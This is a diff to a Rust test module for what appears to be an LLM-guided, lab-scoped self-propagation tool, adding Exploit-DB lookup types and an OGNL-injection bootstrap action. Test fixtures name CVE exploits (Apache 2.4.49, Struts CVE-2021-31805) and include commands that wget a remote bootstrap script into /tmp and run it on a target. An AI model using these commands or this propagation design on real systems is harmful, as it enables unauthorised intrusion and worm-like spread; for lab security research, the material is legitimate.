@@ -12,10 +12,12 @@ mod tests {
         policy::{PolicyGate, MAX_ATTEMPTS},
         types::{
             ArtifactType, BootstrapAction, BootstrapPlan, BootstrapStep, DiscoveryQuery,
-            ExecutionResultSummary, ExpectedResult, LineageSummary, LlmAttemptEvidence, NextAction,
-            OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyRejectionReason,
-            PortScan, PortState, PropagationMethod, PropagationMethodClass, PropagationStrategy,
-            RejectedStrategy, SecretRef, SecretSource, SshAuth, TransportProtocol,
+            EnrichmentCapability, EnrichmentLookupStatus, EnrichmentRequest, EnrichmentResult,
+            ExecutionResultSummary, ExpectedResult, ExploitReference, LineageSummary,
+            LlmAttemptEvidence, NextAction, OsHint, OsHintSource, PatternFindingSummary,
+            PolicyDecision, PolicyRejectionReason, PortScan, PortState, PropagationMethod,
+            PropagationMethodClass, PropagationStrategy, RejectedStrategy, SecretRef, SecretSource,
+            SshAuth, TransportProtocol,
         },
         LlmClient,
     };
@@ -176,6 +178,7 @@ mod tests {
             preconditions: vec!["Port 22 open".into()],
             validation_check: Some("SSH connection accepted".into()),
             safety_notes: vec!["Lab only".into()],
+            enrichment_request: None,
         });
     }
 
@@ -198,6 +201,7 @@ mod tests {
             ],
             validation_check: Some("HTTP 200 with command output".into()),
             safety_notes: vec!["Lab only".into()],
+            enrichment_request: None,
         });
     }
 
@@ -214,6 +218,7 @@ mod tests {
             preconditions: vec!["Apache 2.4.49".into(), "mod_cgi active".into()],
             validation_check: None,
             safety_notes: vec!["Exploit disabled by default — lab mode only.".into()],
+            enrichment_request: None,
         });
     }
 
@@ -230,6 +235,7 @@ mod tests {
             preconditions: vec![],
             validation_check: None,
             safety_notes: vec![],
+            enrichment_request: None,
         });
     }
 
@@ -286,6 +292,7 @@ mod tests {
             preconditions: vec!["Port 80 open".into(), "Apache 2.4.49 with mod_cgi".into()],
             validation_check: Some("physarum-maze process running on B".into()),
             safety_notes: vec!["Lab only".into()],
+            enrichment_request: None,
         });
     }
 
@@ -335,6 +342,8 @@ mod tests {
             attempt_number: 2,
             source_ip: Some("10.0.0.1".parse().unwrap()),
             ephemeral_pubkey: Some("ssh-ed25519 AAAA... physarum-ephemeral".into()),
+            available_enrichment_capabilities: vec![EnrichmentCapability::ExploitDb],
+            enrichment_result: None,
             pattern_findings: vec![
                 PatternFindingSummary {
                     check_id: "nginx-server-detect".into(),
@@ -381,6 +390,8 @@ mod tests {
             strategy_confidence: 0.82,
             target_port: Some(80),
             cve_candidate_ids: vec!["CVE-2021-23017".into()],
+            enrichment_requested: false,
+            exploit_reference_id: None,
         });
 
         round_trip(&LlmAttemptEvidence {
@@ -402,6 +413,8 @@ mod tests {
             strategy_confidence: 0.45,
             target_port: Some(22),
             cve_candidate_ids: vec![],
+            enrichment_requested: false,
+            exploit_reference_id: None,
         });
 
         round_trip(&LlmAttemptEvidence {
@@ -420,6 +433,8 @@ mod tests {
             strategy_confidence: 0.0,
             target_port: None,
             cve_candidate_ids: vec![],
+            enrichment_requested: false,
+            exploit_reference_id: None,
         });
     }
 
@@ -445,6 +460,8 @@ mod tests {
             pattern_findings: vec![],
             source_ip: None,
             ephemeral_pubkey: None,
+            available_enrichment_capabilities: vec![],
+            enrichment_result: None,
         };
 
         let strategy = client.query_propagation(&query).await.unwrap();
@@ -477,6 +494,8 @@ mod tests {
             pattern_findings: vec![],
             source_ip: None,
             ephemeral_pubkey: None,
+            available_enrichment_capabilities: vec![],
+            enrichment_result: None,
         };
 
         let strategy = client.query_propagation(&query).await.unwrap();
@@ -506,6 +525,8 @@ mod tests {
             pattern_findings: vec![],
             source_ip: None,
             ephemeral_pubkey: None,
+            available_enrichment_capabilities: vec![],
+            enrichment_result: None,
         };
 
         let strategy = client.query_propagation(&query).await.unwrap();
@@ -569,6 +590,8 @@ mod tests {
             pattern_findings: vec![],
             source_ip: None,
             ephemeral_pubkey: None,
+            available_enrichment_capabilities: vec![],
+            enrichment_result: None,
         };
         let json = serde_json::to_string(&q).unwrap();
         // Empty pattern_findings must be omitted — backwards compat with v0.3.0 lineage.
@@ -626,5 +649,170 @@ mod tests {
         let json_without = serde_json::to_string(&without_port).unwrap();
         assert!(json_with.contains("8080"));
         assert!(!json_without.contains("port"));
+    }
+
+    // ── OgnlExec round-trip (Issue #144) ─────────────────────────────────────
+
+    #[test]
+    fn ognl_exec_action_round_trip() {
+        round_trip(&BootstrapAction::OgnlExec {
+            commands: vec![
+                "wget -q http://10.0.0.1:8001/bootstrap.sh -O /tmp/bootstrap.sh".into(),
+                "sh /tmp/bootstrap.sh".into(),
+            ],
+            port: Some(8080),
+            path_prefix: Some("/".into()),
+            extra_headers: vec![],
+        });
+        // Minimal — no optional fields
+        round_trip(&BootstrapAction::OgnlExec {
+            commands: vec!["id".into()],
+            port: None,
+            path_prefix: None,
+            extra_headers: vec![],
+        });
+    }
+
+    // ── EnrichmentRequest / EnrichmentResult round-trip (Issue #144) ─────────
+
+    #[test]
+    fn enrichment_request_round_trip() {
+        round_trip(&EnrichmentRequest {
+            source: EnrichmentCapability::ExploitDb,
+            cve_id: "CVE-2021-31805".into(),
+            reason: "Need to confirm OGNL command-per-request constraint.".into(),
+        });
+        round_trip(&EnrichmentRequest {
+            source: EnrichmentCapability::SearchSploitLocal,
+            cve_id: "CVE-2020-17530".into(),
+            reason: "Check freemarker.Execute delivery pattern.".into(),
+        });
+    }
+
+    #[test]
+    fn exploit_reference_round_trip() {
+        round_trip(&ExploitReference {
+            exploit_reference_id: "EDB-51213".into(),
+            source: EnrichmentCapability::ExploitDb,
+            cve_id: Some("CVE-2021-31805".into()),
+            product: Some("Apache Struts".into()),
+            version_range: Some("2.0.0 - 2.5.29".into()),
+            platform: Some("linux".into()),
+            exploit_type: Some("webapps".into()),
+            verified_status: true,
+            requires_auth: false,
+            requires_user_interaction: false,
+            requires_outbound_callback: true,
+            expected_effect: Some("Remote Code Execution".into()),
+            safety_class: Some("lab-only".into()),
+            summary: Some("OGNL injection via HTTP; freemarker.Execute; one OS command per request".into()),
+        });
+    }
+
+    #[test]
+    fn enrichment_result_found_round_trip() {
+        round_trip(&EnrichmentResult {
+            request: EnrichmentRequest {
+                source: EnrichmentCapability::ExploitDb,
+                cve_id: "CVE-2021-31805".into(),
+                reason: "technique confirmation".into(),
+            },
+            references: vec![ExploitReference {
+                exploit_reference_id: "EDB-51213".into(),
+                source: EnrichmentCapability::ExploitDb,
+                cve_id: Some("CVE-2021-31805".into()),
+                product: None,
+                version_range: None,
+                platform: None,
+                exploit_type: None,
+                verified_status: false,
+                requires_auth: false,
+                requires_user_interaction: false,
+                requires_outbound_callback: false,
+                expected_effect: None,
+                safety_class: None,
+                summary: None,
+            }],
+            status: EnrichmentLookupStatus::Found { count: 1 },
+        });
+        round_trip(&EnrichmentResult {
+            request: EnrichmentRequest {
+                source: EnrichmentCapability::ExploitDb,
+                cve_id: "CVE-9999-00000".into(),
+                reason: "test".into(),
+            },
+            references: vec![],
+            status: EnrichmentLookupStatus::NotFound,
+        });
+    }
+
+    #[test]
+    fn propagation_strategy_with_enrichment_request_round_trip() {
+        round_trip(&PropagationStrategy {
+            method: PropagationMethod::NoPath {
+                reason: "requesting Exploit-DB enrichment".into(),
+            },
+            artifact_type: ArtifactType::None,
+            bootstrap_plan: None,
+            confidence: 0.0,
+            reasoning_summary: "Requesting CVE-2021-31805 technique details.".into(),
+            preconditions: vec![],
+            validation_check: None,
+            safety_notes: vec![],
+            enrichment_request: Some(EnrichmentRequest {
+                source: EnrichmentCapability::ExploitDb,
+                cve_id: "CVE-2021-31805".into(),
+                reason: "Need freemarker.Execute command-per-request constraint.".into(),
+            }),
+        });
+    }
+
+    #[test]
+    fn policy_gate_accepts_ognl_exec_strategy() {
+        use std::net::Ipv4Addr;
+        let gate = PolicyGate {
+            allowed_cidrs: vec![("172.21.0.0".parse::<Ipv4Addr>().unwrap(), 24)],
+            exploit_enabled: true,
+            allowed_methods: vec![
+                PropagationMethodClass::Ssh,
+                PropagationMethodClass::Http,
+                PropagationMethodClass::Exploit,
+                PropagationMethodClass::NoPath,
+            ],
+            ..PolicyGate::lab_default()
+        };
+        let strategy = PropagationStrategy {
+            method: PropagationMethod::Exploit {
+                cve: "CVE-2021-31805".into(),
+            },
+            artifact_type: ArtifactType::AgentBinary,
+            bootstrap_plan: Some(BootstrapPlan {
+                steps: vec![BootstrapStep {
+                    action: BootstrapAction::OgnlExec {
+                        commands: vec!["wget http://172.21.0.2:8001/bootstrap.sh -O /tmp/b.sh".into()],
+                        port: Some(8080),
+                        path_prefix: None,
+                        extra_headers: vec![],
+                    },
+                    target: "172.21.0.5".into(),
+                    timeout_ms: 10000,
+                    requires_root: false,
+                    expected_result: ExpectedResult {
+                        success_indicator: "OGNL fired".into(),
+                        failure_indicator: None,
+                    },
+                }],
+            }),
+            confidence: 0.9,
+            reasoning_summary: "CVE-2021-31805 OGNL via OgnlExec.".into(),
+            preconditions: vec![],
+            validation_check: None,
+            safety_notes: vec![],
+            enrichment_request: None,
+        };
+        assert!(matches!(
+            gate.evaluate(&strategy, "172.21.0.5".parse().unwrap(), 1),
+            PolicyDecision::Accepted
+        ));
     }
 }
